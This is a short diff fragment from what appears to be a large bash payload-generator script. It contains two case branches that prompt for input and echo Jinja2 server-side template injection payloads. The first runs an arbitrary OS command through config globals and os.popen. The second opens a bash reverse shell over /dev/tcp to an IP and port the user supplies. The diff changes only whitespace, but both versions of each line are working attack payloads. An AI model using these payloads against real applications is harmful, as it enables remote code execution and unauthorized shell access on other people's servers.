@@ -8758,7 +8758,7 @@ while true; do
 		read -p "(example, whoami): " CMD
 		if [[ "$CMD" != "" ]];
 		then
-		echo "{{config.__class__.__init__.__globals__['os'].popen(\"""$CMD""\").read()}}"
+			echo "{{config.__class__.__init__.__globals__['os'].popen(\"""$CMD""\").read()}}"
 		fi
 	;;
 	"2252")
@@ -8770,7 +8770,7 @@ while true; do
 			read -p "(example, 9001): " MPRT
 			if [[ "$MPRT" != "" ]];
 			then
-				echo "{{config.__class__.__init__.__globals__['os'].popen(\"bash -c 'bash -i >&/dev/tcp/""$MIP""/""$MPRT"" 0>&1'\").read()}}"
+				echo "{{config.__class__.__init__.__globals__['os'].popen(\"bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\").read()}}"
 			fi
 		fi
 
